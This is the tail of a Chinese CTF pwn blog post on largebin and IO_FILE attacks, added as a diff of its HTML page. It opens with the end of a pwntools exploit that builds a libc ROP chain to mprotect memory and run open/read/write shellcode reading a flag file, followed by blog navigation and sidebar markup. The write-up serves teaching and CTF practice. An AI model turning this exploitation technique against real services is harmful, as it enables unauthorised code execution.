+    <span class="n">poprdi</span> <span class="o">=</span> <span class="mh">0x0000000000026b72</span><span class="o">+</span><span class="n">libc_base</span>
+    <span class="n">poprsi</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x0000000000027529</span>
+    <span class="n">pop2rdx</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000011c1e1</span>
+    <span class="n">poprax</span> <span class="o">=</span> <span class="n">libc_base</span><span class="o">+</span><span class="mh">0x000000000004a550</span>
+
+    <span class="c">#mprotect(free_hook1,0x2000,7) &amp;&amp; orw shellcode</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="n">poprdi</span><span class="p">,</span><span class="n">free_hook1</span><span class="p">,</span><span class="n">poprsi</span><span class="p">,</span><span class="mh">0x2000</span><span class="p">,</span><span class="n">pop2rdx</span><span class="p">,</span><span class="mh">0x7</span><span class="p">,</span><span class="mi">0</span><span class="p">]</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="p">[</span><span class="n">poprax</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="n">syscall</span><span class="p">,</span><span class="n">free_hook1</span><span class="o">+</span><span class="mh">0x58</span><span class="p">]</span>
+
+    <span class="n">sc</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="nb">open</span><span class="p">(</span><span class="s">"flag"</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="s">"rax"</span><span class="p">,</span><span class="n">free_hook1</span><span class="o">+</span><span class="mh">0x300</span><span class="p">,</span><span class="mh">0x40</span><span class="p">)</span>
+    <span class="n">sc</span> <span class="o">+=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">free_hook1</span><span class="o">+</span><span class="mh">0x300</span><span class="p">,</span><span class="mh">0x40</span><span class="p">)</span>
+    <span class="n">cmd</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+
+    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">flat</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span><span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="n">sc</span><span class="p">))</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">exp</span><span class="p">()</span>
+</code></pre></td></tr></tbody></table></div></div>
+
+<ul>
+  <li>声明：本文经安全客授权发布，转载请联系安全客平台</li>
+</ul>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+      
+      
+
+      
+      
+        <div class="post-nav" id="post-nav-id">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/ctf/pwn/2020/10/11/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91pwn/" rel="next" title="西湖论剑2020">
+                <i class="fa fa-chevron-left"></i> 西湖论剑2020
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/ctf/pwn/2020/09/17/Unlink-%E6%8A%80%E5%B7%A7/" rel="prev" title="Unlink 使用技巧">
+                Unlink 使用技巧 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+      
+
+      
+    </footer>
+  </article>
+
+  <div class="post-spread">
+    
+  </div>
+</div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+        
+        
+        
+
+
+
+
+
+
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/upload/MyAvatar.jpeg"
+               alt="Vinadiak" />
+          <p class="site-author-name" itemprop="name">Vinadiak</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/">
+                <span class="site-state-item-count">8</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+
+        </nav>
+
+        
+        
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              
+              
+              <span class="links-of-author-item">
+                <a href="https://github.com/VinadiakT" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                
+                
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.ol4three.com" title="老三师傅" target="_blank">老三师傅</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+
+
+
+
+
+
+
+            
+              <div class="post-toc-content">
+    <ol class=nav>
+      <li class="nav-item nav-level-1"> <a class="nav-link" href="#前言"> <span class="nav-number">1</span> <span class="nav-text">前言</span> </a> </li> <li class="nav-item nav-level-1"> <a class="nav-link" href="#largebin-attack"> <span class="nav-number">2</span> <span class="nav-text">largebin attack</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-2"> <a class="nav-link" href="#io_file攻击原理"> <span class="nav-number">2.1</span> <span class="nav-text">IO_FIle攻击原理：</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#攻击流程"> <span class="nav-number">2.2</span> <span class="nav-text">攻击流程</span> </a> </li> <li class="nav-item nav-level-2"> <a class="nav-link" href="#练习"> <span class="nav-number">2.3</span> <span class="nav-text">练习</span> </a> <ol class="nav-child"> <li class="nav-item nav-level-3"> <a class="nav-link" href="#分析"> <span class="nav-number">2.3.1</span> <span class="nav-text">分析：</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#利用"> <span class="nav-number">2.3.2</span> <span class="nav-text">利用：</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#调试"> <span class="nav-number">2.3.3</span> <span class="nav-text">调试</span> </a> </li> <li class="nav-item nav-level-3"> <a class="nav-link" href="#完整exp"> <span class="nav-number">2.3.4</span> <span class="nav-text">完整exp:</span> </a> </li> </ol> </li> </ol> </li>
+    </ol>
+  </div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Vinadiak</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+   
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  
+  
+  
+  
+  <script type="text/javascript" src="/assets/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/assets/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  <script type="text/javascript" src="/assets/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/assets/js/src/post-details.js?v=5.1.1"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/assets/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+    
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
